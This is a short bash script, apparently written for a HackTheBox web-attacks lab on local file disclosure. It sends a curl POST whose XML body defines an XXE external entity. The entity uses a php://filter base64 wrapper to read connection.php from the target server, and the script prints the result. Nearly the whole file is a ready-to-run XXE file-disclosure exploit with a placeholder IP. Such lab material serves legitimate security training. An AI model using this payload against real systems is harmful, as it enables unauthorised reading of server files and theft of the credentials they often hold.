#!/bin/bash

# For HacktheBox module Web Attacks: Local File Disclosure
# Basic curl request with XXE, LFI, and PHP filters done for HacktheBox

# Change IP
request=$(curl -s -X POST "http://<IP>/submitDetails.php" \
     -H "Content-Type: application/xml" \
     --data '<?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE email [
               <!ENTITY pwned SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
             ]>
             <root>
               <name>skript</name>
               <tel>3434343434</tel>
               <email>&pwned;</email>
               <message>Git Pwn3d Ez</message>
             </root>')
echo "$request"
